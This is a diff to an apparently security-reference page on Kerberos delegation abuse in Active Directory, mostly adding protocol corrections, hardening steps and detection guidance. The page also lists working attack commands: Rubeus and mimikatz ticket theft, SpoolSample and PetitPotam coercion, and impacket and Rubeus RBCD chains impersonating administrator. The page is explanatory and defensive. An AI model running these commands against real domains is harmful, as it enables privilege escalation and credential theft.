@@ -2,6 +2,8 @@
 
 Abusing unconstrained, constrained, and resource-based constrained delegation.
 
+**MITRE ATT&CK:** [T1558](https://attack.mitre.org/techniques/T1558/) Steal or Forge Kerberos Tickets
+
 Kerberos delegation allows a service to act on behalf of a user when accessing other services.
 Active Directory implements three delegation models, each with distinct abuse patterns. All three
 share a common theme: the attacker leverages a compromised account's delegation privileges to
@@ -16,8 +18,11 @@ For the protocol mechanics of delegation, see [Delegation](../../protocol/delega
 ### How It Works
 
 When a user authenticates to a service with unconstrained delegation
-(`TRUSTED_FOR_DELEGATION` flag set on the service's account), the KDC includes the user's
-**forwarded TGT** inside the service ticket. The service extracts this TGT and can use it to
+(`TRUSTED_FOR_DELEGATION` flag set on the service's account), the KDC sets the `OK-AS-DELEGATE`
+flag in the service ticket. Seeing that flag, the client requests a **forwarded TGT** from the
+KDC and sends it to the service itself, inside the authenticator of the AP-REQ
+([RFC 4121 &sect;4.1.1](https://datatracker.ietf.org/doc/html/rfc4121#section-4.1.1)); the KDC does
+not put the TGT in the service ticket. The service extracts this TGT and can use it to
 request service tickets to **any** service in the domain, as that user.
 
 This means every user who authenticates to an unconstrained delegation host leaves a copy of
@@ -72,35 +77,47 @@ Attacker                  Compromised Host           Domain Controller
 **Remove unnecessary unconstrained delegation:**
 
 ```powershell title="Find all accounts with unconstrained delegation"
-# Find all accounts with unconstrained delegation (should only return DCs)
+# Computers with unconstrained delegation (should only return DCs)
 Get-ADComputer -Filter 'TrustedForDelegation -eq $true' -Properties TrustedForDelegation |
     Select-Object Name, DNSHostName
+
+# User accounts with unconstrained delegation (should return nothing)
+Get-ADUser -Filter 'TrustedForDelegation -eq $true' -Properties TrustedForDelegation |
+    Select-Object Name, DistinguishedName
 ```
 
 Domain controllers inherently require unconstrained delegation. All other accounts should use
-constrained delegation or RBCD instead.
+constrained delegation or RBCD instead. The flag can be set on user service accounts as well as
+computers, so audit both; [Mitigations](../../security/mitigations.md#unconstrained-delegation)
+has a version that excludes domain controllers by primary group.
 
 **Protect high-value accounts:**
 
-- Add Domain Admins and other sensitive accounts to the **Protected Users** group -- their TGTs
-  are issued as non-forwardable, so they are not included in service tickets even for
-  unconstrained delegation hosts
+- Add Domain Admins and other sensitive accounts to the **Protected Users** group -- members
+  cannot be delegated with unconstrained or constrained delegation, so the KDC does not issue
+  a forwarded TGT for them and none reaches an unconstrained delegation host
 - Mark individual accounts as **"Account is sensitive and cannot be delegated"** in Active
   Directory
+- Enable **Credential Guard** on the machines privileged users sign in to. Microsoft documents
+  that with it enabled "Kerberos doesn't allow unconstrained Kerberos delegation"
+  ([How Credential Guard works](https://learn.microsoft.com/en-us/windows/security/identity-protection/credential-guard/how-it-works))
 
 **Block coercion vectors:**
 
 - Disable the Print Spooler service on all domain controllers:
   `Stop-Service Spooler; Set-Service Spooler -StartupType Disabled`
-- Apply patches for PetitPotam (CVE-2021-36942)
+- Install the August 10, 2021 or later updates on domain controllers (CVE-2021-36942, Windows
+  LSA Spoofing). Per Microsoft the update "blocks the affected API calls OpenEncryptedFileRawA
+  and OpenEncryptedFileRawW through LSARPC interface"; Microsoft says further steps are needed
+  and points to [KB5005413](https://support.microsoft.com/help/5005413)
 - Restrict authenticated access to coercion-vulnerable RPC interfaces
 
 ### Detect
 
 | Event / Signal | Description |
 |---|---|
-| `Get-ADComputer -Filter 'TrustedForDelegation -eq $true'` | Periodic audit -- only DCs should appear |
-| Event 4624 (type 3) with delegation flag | Network logon to an unconstrained delegation host from a high-privilege account |
+| `Get-ADComputer` / `Get-ADUser` with `-Filter 'TrustedForDelegation -eq $true'` | Periodic audit -- only DCs should appear |
+| Event 4624 (type 3) with `Impersonation Level` = `Delegation` | Network logon to an unconstrained delegation host from a high-privilege account. Logged on the host itself (Audit Logon subcategory), not on the domain controller |
 | TGT forwarding patterns | Unusual concentration of forwarded TGTs at a single host |
 | Coercion indicators | Print Spooler RPC calls or EFSRPC calls from unexpected sources |
 
@@ -131,6 +148,14 @@ and issues the ticket.
 3. Use S4U2Proxy to forward that ticket to the allowed target service
 4. Access the target service as the impersonated user
 
+"Any user" has two limits, both in [MS-SFU &sect;3.2.5.1.2](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/ad98268b-f75b-42c3-b09b-959282770642).
+The KDC must set FORWARDABLE on the S4U2Self ticket when the requesting account has protocol
+transition (`TRUSTED_TO_AUTH_FOR_DELEGATION`), and must not set it for an account configured
+for "Kerberos only" constrained delegation. And it should not set the flag when the impersonated user
+is marked "Account is sensitive and cannot be delegated", which Protected Users membership
+implies. Classic constrained delegation requires a forwardable evidence ticket, so in both
+cases step 3 fails. See [FORWARDABLE Flag](../../protocol/s4u.md#forwardable-flag).
+
 **SPN substitution:**
 
 The `sname` field in the service ticket is **not protected** by the PAC signature. The SPN in
@@ -150,18 +175,19 @@ computer account.
 - **Minimize constrained delegation scope** -- only configure `msDS-AllowedToDelegateTo` where
   absolutely required
 - **Monitor changes** to `msDS-AllowedToDelegateTo` (Event 5136 for directory service object
-  modifications)
+  modifications; it needs the audit settings described under [RBCD](#rbcd), Defend)
 - **Prefer RBCD** over constrained delegation where possible -- RBCD is configured on the target
   rather than the source, making it easier to audit and manage
-- **Use Protected Users** for sensitive accounts -- their tickets cannot be delegated
+- **Use Protected Users** for sensitive accounts -- their tickets cannot be delegated. The
+  "Account is sensitive and cannot be delegated" flag has the same effect for a single account
 
 ### Detect
 
 | Event / Signal | Description |
 |---|---|
-| Event 4769 with Transited Services | TGS requests where the `Transited Services` field is populated indicate S4U2Proxy activity |
+| Event 4769 with Transited Services | TGS requests where the `Transited Services` field is populated indicate S4U2Proxy activity. Microsoft defines the field as the "list of SPNs which were requested if constrained Kerberos delegation was used". The same requests have bit 14 (`cname-in-addl-tkt`, mask `0x00020000`) set in `Ticket Options` (bit number from MS-SFU &sect;2.2.3; Microsoft's 4769 flag table labels bit 14 "Request-anonymous"; not captured in this site's lab) |
 | Event 5136 | Changes to `msDS-AllowedToDelegateTo` attribute |
-| Unusual S4U patterns | S4U2Self requests for high-privilege accounts from low-privilege services |
+| Event 4769 for a ticket to the requester itself | What the S4U2Self step looks like by the documented field definitions: `Account Name` is "the account that requested the ticket" (the service), and the ticket is for that same account. The documented fields include none for the user being impersonated, and `Transited Services` is documented for constrained delegation, not for S4U2Self, so "S4U2Self for a privileged user" cannot be read from 4769 alone. Not captured in this site's lab |
 
 ---
 
@@ -186,7 +212,7 @@ requires **write access to the target computer object** -- not Domain Admin priv
    computer accounts (`ms-DS-MachineAccountQuota` default is 10)
 
     ```bash title="Create a computer account via impacket addcomputer"
-    addcomputer.py CORP.LOCAL/jsmith:password -computer-name FAKEMACHINE$ -computer-pass 'FakePass123!'
+    addcomputer.py 'CORP.LOCAL/jsmith:<password>' -computer-name FAKEMACHINE$ -computer-pass '<password>'
     ```
 
 3. **Configure RBCD** -- write the controlled computer account's SID to
@@ -245,7 +271,7 @@ computer object:
 **Set `ms-DS-MachineAccountQuota` to 0:**
 
 ```powershell title="Set ms-DS-MachineAccountQuota to 0 to prevent unprivileged computer account creation"
-Set-ADDomain -Identity CORP.LOCAL -Replace @{"ms-DS-MachineAccountQuota" = 0}
+Set-ADDomain -Identity CORP.LOCAL -Replace @{"ms-DS-MachineAccountQuota" = 0 }
 ```
 
 This prevents domain users from creating computer accounts, removing the easiest path to a
@@ -261,6 +287,35 @@ Event ID: 5136
 Attribute: msDS-AllowedToActOnBehalfOfOtherIdentity
 ```
 
+!!! warning "Event 5136 needs two things before it is logged"
+    The **Audit Directory Service Changes** subcategory must be enabled on domain controllers,
+    and, in Microsoft's words, "the modified object must have an appropriate entry in SACL: the
+    'Write' action auditing for specific attributes". If the auditing entries (SACL) on the
+    computer and user objects do not cover writes to `msDS-AllowedToActOnBehalfOfOtherIdentity`,
+    `msDS-AllowedToDelegateTo`, or `servicePrincipalName`, changing those attributes produces no
+    5136 event. Verify by making a test change and looking for the event. A change normally
+    appears as two events, "Value Deleted" and then "Value Added"; the second one carries the
+    new value.
+
+**Protect the accounts worth impersonating:**
+
+Add Domain Admins and other sensitive accounts to **Protected Users** or mark them **"Account
+is sensitive and cannot be delegated"**. An S4U2Self ticket for such a user is not forwardable,
+and per Microsoft's guidance a domain controller that enforces the CVE-2020-16996 fix does not
+allow a non-forwardable ticket to be used for RBCD. Enforcement has been the default since the
+March 9, 2021 updates unless the `NonForwardableDelegation` registry value was set to disable it
+([Microsoft guidance for CVE-2020-16996](https://support.microsoft.com/en-us/topic/managing-deployment-of-rbcd-protected-user-changes-for-cve-2020-16996-9a59a49f-20b9-a292-f205-da9da0ff24d3)).
+Do not count on this to protect accounts that are not marked. For an ordinary user the
+specification is not consistent: the KDC rules in
+[MS-SFU &sect;3.2.5.2.3](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/dd1b47f9-580c-4c4e-8f34-4485b9728331)
+require a forwardable evidence ticket for RBCD, while the client rules in
+[MS-SFU &sect;3.1.5.2.1](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/ddb2cafd-1f01-4834-b52a-d4a5b34cd960)
+still allow "a nonforwardable S4U2self-generated user's service ticket for a nonsensitive
+user". This site has not tested which rule a current domain controller applies, and the
+sensitive-user behavior above is likewise taken from Microsoft's guidance and the
+specification, not from the lab; see the box "RBCD and the forwardable flag" under
+[FORWARDABLE Flag](../../protocol/s4u.md#forwardable-flag).
+
 **Restrict write access to computer objects:**
 
 - Audit ACLs on computer objects regularly
@@ -269,16 +324,16 @@ Attribute: msDS-AllowedToActOnBehalfOfOtherIdentity
 
 **Monitor computer account creation:**
 
-Event 4741 logs new computer account creation. Alert on unexpected computer accounts created by
-non-admin users.
+Event 4741 logs new computer account creation (Audit Computer Account Management subcategory,
+on domain controllers). Alert on unexpected computer accounts created by non-admin users.
 
 ### Detect
 
 | Event / Signal | Description |
 |---|---|
-| Event 5136 | Directory service object modification -- filter for `msDS-AllowedToActOnBehalfOfOtherIdentity` |
+| Event 5136 | Directory service object modification -- filter for `msDS-AllowedToActOnBehalfOfOtherIdentity`. Logged only with Audit Directory Service Changes enabled and a SACL that audits writes to the attribute (see Defend above) |
 | Event 4741 | New computer account creation -- alert if the creator is not an expected admin |
-| Event 4769 with Transited Services | S4U2Proxy activity for the target computer |
+| Event 4769 with Transited Services | S4U2Proxy activity for the target computer (also `Ticket Options` bit 14, mask `0x00020000`) (bit number from MS-SFU &sect;2.2.3; Microsoft's 4769 flag table labels bit 14 "Request-anonymous"; not captured in this site's lab) |
 | New computer accounts | Unexpected accounts matching patterns like short names or unusual naming conventions |
 
 ---
@@ -295,8 +350,8 @@ non-admin users.
 |---|---|---|
 | Rubeus | `Rubeus.exe monitor /interval:5 /nowrap` | Monitors for new TGTs arriving via unconstrained delegation |
 | mimikatz | `sekurlsa::tickets /export` | Exports all cached Kerberos tickets including forwarded TGTs |
-| SpoolSample | `SpoolSample.exe dc01.corp.local attacker.corp.local` | Triggers PrinterBug coercion |
-| PetitPotam | `PetitPotam.py attacker.corp.local dc01.corp.local` | Triggers EFSRPC coercion |
+| SpoolSample | `SpoolSample.exe dc1.corp.local attacker.corp.local` | Triggers PrinterBug coercion |
+| PetitPotam | `PetitPotam.py attacker.corp.local dc1.corp.local` | Triggers EFSRPC coercion |
 
 ### Constrained Delegation
 
@@ -309,7 +364,7 @@ non-admin users.
 
 | Tool | Command | Notes |
 |---|---|---|
-| impacket | `rbcd.py CORP.LOCAL/jsmith:pass -delegate-from FAKEMACHINE$ -delegate-to TARGET$ -action write` | Configures RBCD attribute |
-| impacket | `getST.py CORP.LOCAL/FAKEMACHINE$:FakePass -spn CIFS/target.corp.local -impersonate administrator` | Performs S4U chain after RBCD configuration |
+| impacket | `rbcd.py CORP.LOCAL/jsmith:<password> -delegate-from FAKEMACHINE$ -delegate-to TARGET$ -action write` | Configures RBCD attribute |
+| impacket | `getST.py CORP.LOCAL/FAKEMACHINE$:<password> -spn CIFS/target.corp.local -impersonate administrator` | Performs S4U chain after RBCD configuration |
 | Rubeus | `Rubeus.exe s4u /user:FAKEMACHINE$ /rc4:<hash> /impersonateuser:administrator /msdsspn:CIFS/target.corp.local /ptt` | S4U chain from controlled computer account |
 | PowerView | `Set-DomainObject -Identity TARGET$ -Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity'=...}` | Configures RBCD via PowerShell |
